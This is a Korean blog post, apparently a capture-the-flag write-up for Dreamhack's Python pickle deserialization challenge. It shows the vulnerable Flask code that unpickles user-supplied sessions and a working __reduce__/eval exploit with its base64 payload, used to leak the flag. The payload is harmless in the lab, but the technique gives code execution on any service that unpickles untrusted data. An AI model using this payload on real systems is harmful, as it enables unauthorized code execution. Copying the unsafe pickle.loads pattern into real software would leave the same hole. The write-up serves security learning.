---
title: (26) Dreamhack web-deserialize-python 문제 풀이
date: 2024-02-01 +09:00
categories:
  - 웹해킹
tags:
  - [웹해킹, 드림핵]
---
{% raw %}
## 문제 설명
Session Login이 구현된 서비스입니다.  
Python(pickle)의 Deserialize 취약점을 이용해 플래그를 획득하세요. 플래그는 flag.txt 또는 FLAG 변수에 있습니다.

## 문제 풀이
사이트에는 아래의 두 페이지가 있습니다.
![](https://kyuyeop.github.io/assets/img/post/26/1.png)
![](https://kyuyeop.github.io/assets/img/post/26/2.png)
세션 만드는 것 부터 보면
![](https://kyuyeop.github.io/assets/img/post/26/3.png)
`asdf / 1234 / password!` 로 입력했더니
![](https://kyuyeop.github.io/assets/img/post/26/4.png)
```
gAN9cQAoWAQAAABuYW1lcQFYBAAAAGFzZGZxAlgGAAAAdXNlcmlkcQNYBAAAADEyMzRxBFgIAAAAcGFzc3dvcmRxBVgJAAAAcGFzc3dvcmQhcQZ1Lg==
```
위와 같은 문자열을 주네요. 좀 공부하신 분들은 아실테지만 `==`으로 끝나는거 보니 base64 인코딩을 하는것 같습니다.  
그럼 위 문자열로 세션를 체크해봅시다.
![](https://kyuyeop.github.io/assets/img/post/26/5.png)
이렇게 원래 세션을 만들때 넣었던 값들이 나타납니다.  
  
이제 코드를 한번 보겠습니다.
```python
#!/usr/bin/env python3
from flask import Flask, request, render_template, redirect
import os, pickle, base64

app = Flask(__name__)
app.secret_key = os.urandom(32)

try:
    FLAG = open('./flag.txt', 'r').read() # Flag is here!!
except:
    FLAG = '[**FLAG**]'

INFO = ['name', 'userid', 'password']

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/create_session', methods=['GET', 'POST'])
def create_session():
    if request.method == 'GET':
        return render_template('create_session.html')
    elif request.method == 'POST':
        info = {}
        for _ in INFO:
            info[_] = request.form.get(_, '')
        data = base64.b64encode(pickle.dumps(info)).decode('utf8')
        return render_template('create_session.html', data=data)

@app.route('/check_session', methods=['GET', 'POST'])
def check_session():
    if request.method == 'GET':
        return render_template('check_session.html')
    elif request.method == 'POST':
        session = request.form.get('session', '')
        info = pickle.loads(base64.b64decode(session))
        return render_template('check_session.html', info=info)

app.run(host='0.0.0.0', port=8000)
```
`create_session` 페이지는 `name, userid, password`를 post로 받아서 `dict`로 만들고 그걸 base64로 인코딩해서 보여주는듯 합니다.  
  
`check_session` 페이지는 post로 base64인코딩된 문자열을 받고 디코딩해서 `pickle`로 로드 합니다. 실제로 그런가 확인해봅시다.  
  
이렇게 base64 생성 부분을 모방해서 만들어 봤습니다. 값은 아무거나 넣었습니다.
```python
import pickle, base64

info = {'name': 'test', 'userid': '0000', 'password': 'testpw'}

print(base64.b64encode(pickle.dumps(info)).decode('utf-8'))
```
의 실행결과인 `gASVNwAAAAAAAAB9lCiMBG5hbWWUjAR0ZXN0lIwGdXNlcmlklIwEMDAwMJSMCHBhc3N3b3JklIwGdGVzdHB3lHUu`를 `check_session`페이지에 넣어보면
![](https://kyuyeop.github.io/assets/img/post/26/6.png)
입력값이 잘 나옵니다.  
  
이때 `pickle`을 이용해서 base64을 처리하기에 `pickle deserialize` 취약점이 발생합니다.
### pickle deserialize(unpickling) 취약점
이 취약점은 `pickle`이 데이터를 `loads` 하는 과정에서 발생합니다.  
이때 내장 함수인 `__reduce()__`에서 발생합니다. 이 메소드는 객체의 계층구조를 `unpickling`할때 객체를 재구성하는 것에 대한 `tuple`을 반환하는 메소드입니다. 이때 호출 가능한 객체가 있으면 인수를 가져와서 실행해보는데, 이때 취약점이 발생한다고 합니다.  
  
보통 아래와 같은 코드를 이용해 payload를 만든다고 합니다.
```python
class Exploit:
    def __reduce__(self):
        cmd = "print('It can print or something')"
        return (eval, (cmd,))

payload = pickle.dumps(Exploit())
print(payload)
```  
<br>
  
위 내용을 이해했다면 이를 이용해볼 수 있겠죠.  
위의 두 코드를 조합해 아래와 같은 페이로드를 만들었습니다. 변수나 `flag.txt`에 있다고 했으므로 `cmd`를 `flag.txt`를 읽어 반환하도록 `"open('flag.txt').read()"`로 정했습니다.
```python
import pickle, base64

class Exploit:
    def __reduce__(self):
        cmd = "FLAG"
        return (eval, (cmd,))

info = {'name': Exploit()}

print(base64.b64encode(pickle.dumps(info)).decode('utf-8'))
```
실행하면 `gASVKgAAAAAAAAB9lIwEbmFtZZSMCGJ1aWx0aW5zlIwEZXZhbJSTlIwERkxBR5SFlFKUcy4=`라는 문자열이 나오고, 이를 `check_session`페이지에 넣어보면
![](https://kyuyeop.github.io/assets/img/post/26/7.png)
이렇게 flag가 출력됩니다.
{% endraw %}